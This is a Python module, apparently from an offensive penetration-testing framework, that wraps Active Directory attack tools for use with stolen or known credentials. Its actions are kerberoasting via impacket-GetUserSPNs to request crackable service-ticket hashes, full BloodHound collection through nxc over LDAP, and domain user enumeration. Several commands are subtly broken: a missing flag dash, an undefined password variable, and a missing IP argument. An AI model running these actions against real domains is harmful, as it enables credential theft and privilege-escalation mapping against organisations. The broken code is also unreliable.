import os
from colorama import Fore, Style, init
from core.module_base import ModuleBase
from utils.input_or_file import get_input_or_file
from utils.run_command import run_command



init()


class ValidCreds(ModuleBase):
    def __init__(self):
        super().__init__()
        self.name = "valid_creds"
        self.options = {
            "ip" : None,
            "user" : None,
            "password" : None,
            "domain": None,
        }
        self.actions = {
            "kerberoasting": self.kerberoasting,
            "bloodhound": self.bloodhound,
            "find_all_users": self.find_all_users
        }


    def _prepare(self):
        ip = self.options["ip"]
        if not ip:
            print("[-] ip be set!")
            return None, None
        ip_list = get_input_or_file(ip)
        return ip_list
    
    def banner(self):
        print(Fore.GREEN + f"\n🔥 MODULE {self.name.upper()} 🔥 \n" + Style.RESET_ALL)
        print("\n See options and set a target with 'options'\n")


    #################   
    
    def kerberoasting(self):
        ip = self.options["ip"]
        user = self.options["user"]
        password = self.options["password"]
        domain = self.options["domain"]
        if not all([ip,user,password,domain]):
            print("You must set ip,user,password and domain for kerberoasting")
            return
        
        target = f"{domain}/{user}:{password}"
        command = ["impacket-GetUserSPNs", "-request","dc-ip", ip, target]
        res = run_command(command)
        print(f"[KERBEROASTING] {user}:{password}@{ip} => {res}")


    def bloodhound(self):
        ip = self.options["ip"]
        user = self.options["user"]
        password = self.options["password"]
        if not all([ip,user,password]):
            print("Need ip,user and password for bloodhound")
            return

        command = ["nxc", "ldap", ip, "-u", user, "-p", password, "--bloodhound", "--collection", "All"]
        res = run_command(command)
        print(f"{res}")


    def find_all_users(self):
        ip = self.options["ip"]
        user = self.options["user"]
        domain = self.options["domain"]
        if not all([ip,user,password]):
            print("Need ip,user,domain")
            return
        
        target = f"{domain}/{user}"
        command = ["impacket-GetADUsers.py", "-all", "-dc-ip", target]
        res = run_command(command)
        print(f"{res}")





